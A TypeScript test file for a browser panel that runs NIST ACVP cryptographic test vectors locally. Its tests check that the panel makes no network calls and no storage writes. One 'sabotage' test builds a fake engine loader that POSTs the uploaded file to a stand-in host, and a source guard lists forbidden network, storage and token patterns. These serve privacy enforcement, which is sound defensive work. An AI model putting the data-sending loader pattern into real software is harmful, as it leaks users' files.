// SPDX-License-Identifier: GPL-3.0-only
// F-5 / F-9: the browser flow is local-only. An import → run → download of a
// real NIST fixture must make NO fetch / XHR / sendBeacon / WebSocket call and
// write nothing to localStorage / sessionStorage / IndexedDB. The engine is the
// TEST-ONLY fake (answers from expectedResults.json, no crypto) because jsdom
// cannot load the WASM engines; real-engine results are proven in
// src/services/acvp/acvp.engines.local.test.ts and by the CLI.
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { readFileSync } from 'node:fs'
import path from 'node:path'
import { AcvpFormatPrototypePanel } from './AcvpFormatPrototypePanel'
import { createExpectedResultsFakeEngine } from '@/services/acvp/testing/expectedResultsFakeEngine'
import { DISCLAIMER_IMPORT } from '@/services/acvp/evidence'
import { canonicalJson } from '@/services/acvp/ir'
import { readFixture } from '@/services/acvp/node/fixtures'

const repo = process.cwd()
const promptText = readFixture(repo, 'ML-DSA-sigVer-FIPS204', 'prompt.json')
const expectedText = readFixture(repo, 'ML-DSA-sigVer-FIPS204', 'expectedResults.json')
const goldenResponse = JSON.parse(
  readFileSync(
    path.join(repo, 'src/services/acvp/__fixtures__/goldens/ML-DSA-sigVer-FIPS204.response.json'),
    'utf8'
  )
)

const network = {
  fetch: vi.fn(),
  xhrOpen: vi.fn(),
  xhrSend: vi.fn(),
  beacon: vi.fn(),
  ws: vi.fn(),
}
const saved: Blob[] = []
const savedNames: string[] = []

beforeEach(() => {
  saved.length = 0
  savedNames.length = 0
  vi.stubGlobal('fetch', network.fetch)
  vi.spyOn(XMLHttpRequest.prototype, 'open').mockImplementation(network.xhrOpen)
  vi.spyOn(XMLHttpRequest.prototype, 'send').mockImplementation(network.xhrSend)
  Object.defineProperty(navigator, 'sendBeacon', { value: network.beacon, configurable: true })
  vi.stubGlobal('WebSocket', network.ws)
  vi.stubGlobal('indexedDB', { open: vi.fn() })
  vi.spyOn(Storage.prototype, 'setItem')
  URL.createObjectURL = vi.fn((b: Blob) => {
    saved.push(b)
    return 'blob:local'
  }) as typeof URL.createObjectURL
  URL.revokeObjectURL = vi.fn()
  vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
    this: HTMLAnchorElement
  ) {
    savedNames.push(this.download)
  })
})

afterEach(() => {
  vi.unstubAllGlobals()
  vi.restoreAllMocks()
  Object.values(network).forEach((f) => f.mockReset())
})

const upload = async (text: string, name = 'prompt.json') => {
  const user = userEvent.setup()
  await user.upload(
    screen.getByLabelText('ACVP prompt file'),
    new File([text], name, { type: 'application/json' })
  )
  return user
}

describe('AcvpFormatPrototypePanel', () => {
  it('shows the controlled-data warning and the §2.2 import disclaimer verbatim', () => {
    render(<AcvpFormatPrototypePanel />)
    expect(
      screen.getByText('Issued ACVTS vector sets may be controlled laboratory data.')
    ).toBeVisible()
    expect(screen.getByText(DISCLAIMER_IMPORT)).toBeVisible()
    expect(screen.getByText('ACVP-format compatible prototype')).toBeVisible()
    expect(screen.getByRole('button', { name: /Run locally/ })).toBeDisabled()
  })

  it('import → run → download is local-only: no network call, no storage write, pure ACVP response', async () => {
    const loadEngine = vi.fn(async () => createExpectedResultsFakeEngine(expectedText, promptText))
    render(<AcvpFormatPrototypePanel loadEngine={loadEngine} />)
    const user = await upload(promptText)
    await screen.findByTestId('acvp-io-loaded')
    expect(screen.getByTestId('acvp-io-loaded')).toHaveTextContent(
      'ML-DSA / sigVer / FIPS204, vsId 42, 12 groups, 180 test cases (82 executable here)'
    )

    await user.click(screen.getByRole('button', { name: 'C++ engine' }))
    await user.click(screen.getByRole('button', { name: /Run locally/ }))
    await waitFor(() =>
      expect(screen.getByTestId('acvp-io-summary')).toHaveTextContent(
        '180 test cases on the softhsmv3 C++ engine: 82 answered · 98 unsupported · 0 error'
      )
    )
    expect(loadEngine).toHaveBeenCalledWith('cpp')

    await user.click(screen.getByRole('button', { name: /Download response\.json/ }))
    await user.click(screen.getByRole('button', { name: /Download evidence\.json/ }))
    expect(savedNames).toEqual(['response.json', 'evidence.json'])
    const response = JSON.parse(await saved[0].text())
    expect(canonicalJson(response)).toBe(canonicalJson(goldenResponse))
    const evidence = JSON.parse(await saved[1].text())
    expect(evidence.generator.codePath).toBe('browser')
    expect(evidence.evidenceClass).toBe('nist-acvp-reference-sample')

    expect(network.fetch).not.toHaveBeenCalled()
    expect(network.xhrOpen).not.toHaveBeenCalled()
    expect(network.xhrSend).not.toHaveBeenCalled()
    expect(network.beacon).not.toHaveBeenCalled()
    expect(network.ws).not.toHaveBeenCalled()
    expect((indexedDB as unknown as { open: ReturnType<typeof vi.fn> }).open).not.toHaveBeenCalled()
    expect(Storage.prototype.setItem).not.toHaveBeenCalled()
  })

  it('sabotage: the network spy is live — a loader that phones home is caught', async () => {
    const leaky = vi.fn(async () => {
      await fetch('https://example.invalid/upload', { method: 'POST', body: promptText })
      return createExpectedResultsFakeEngine(expectedText, promptText)
    })
    render(<AcvpFormatPrototypePanel loadEngine={leaky} />)
    const user = await upload(promptText)
    await screen.findByTestId('acvp-io-loaded')
    await user.click(screen.getByRole('button', { name: /Run locally/ }))
    await screen.findByTestId('acvp-io-summary')
    expect(network.fetch).toHaveBeenCalledTimes(1)
  })

  it('rejects a wrong revision with the offending path and never enables Run', async () => {
    render(<AcvpFormatPrototypePanel loadEngine={vi.fn()} />)
    const bad = JSON.parse(promptText)
    bad.revision = 'FIPS204-tr1'
    await upload(JSON.stringify(bad), 'tr1.json')
    await screen.findByText(/tr1\.json was rejected/)
    expect(screen.getByText(/\$\.revision: revision "FIPS204-tr1" is not pinned/)).toBeVisible()
    expect(screen.getByRole('button', { name: /Run locally/ })).toBeDisabled()
  })

  it('Clear drops the loaded prompt from memory', async () => {
    render(<AcvpFormatPrototypePanel loadEngine={vi.fn()} />)
    const user = await upload(promptText)
    await screen.findByTestId('acvp-io-loaded')
    await user.click(screen.getByRole('button', { name: /Clear/ }))
    expect(screen.queryByTestId('acvp-io-loaded')).toBeNull()
    expect(screen.getByRole('button', { name: /Run locally/ })).toBeDisabled()
  })
})

describe('F-9 source guard: no network, storage, or ACVTS credential code in the prototype', () => {
  const files = [
    'src/components/Playground/acvpio/AcvpFormatPrototypePanel.tsx',
    'src/services/acvp/run.ts',
    'src/services/acvp/parser.ts',
    'src/services/acvp/dispatch.ts',
    'src/services/acvp/engine.ts',
    'src/services/acvp/response.ts',
    'src/services/acvp/evidence.ts',
    'src/services/acvp/compare.ts',
    'src/services/acvp/ir.ts',
    'src/services/acvp/schemaValidator.ts',
    'src/services/acvp/schemas/registry.ts',
    'src/services/acvp/node/cli.ts',
    'src/services/acvp/node/loadEngines.ts',
    'scripts/acvp-respond.ts',
  ]
  const forbidden: Array<[string, RegExp]> = [
    ['fetch()', /\bfetch\s*\(/],
    ['XMLHttpRequest', /new\s+XMLHttpRequest/],
    ['sendBeacon', /sendBeacon\s*\(/],
    ['WebSocket', /new\s+WebSocket/],
    ['EventSource', /new\s+EventSource/],
    ['storage write', /(localStorage|sessionStorage)\s*\.\s*setItem/],
    ['IndexedDB', /indexedDB\s*\.\s*open/],
    ['ACVTS host', /acvts\.nist\.gov|demo\.acvts|\/acvp\/v1\//i],
    ['bearer token', /\bBearer\s|['"]Authorization['"]|accessToken|\bjwt\b/i],
    ['http(s) module', /from\s+['"]node:https?['"]/],
  ]
  it.each(files)('%s', (file) => {
    const src = readFileSync(path.join(repo, file), 'utf8')
    for (const [label, re] of forbidden) expect(re.test(src), `${file}: ${label}`).toBe(false)
  })
})
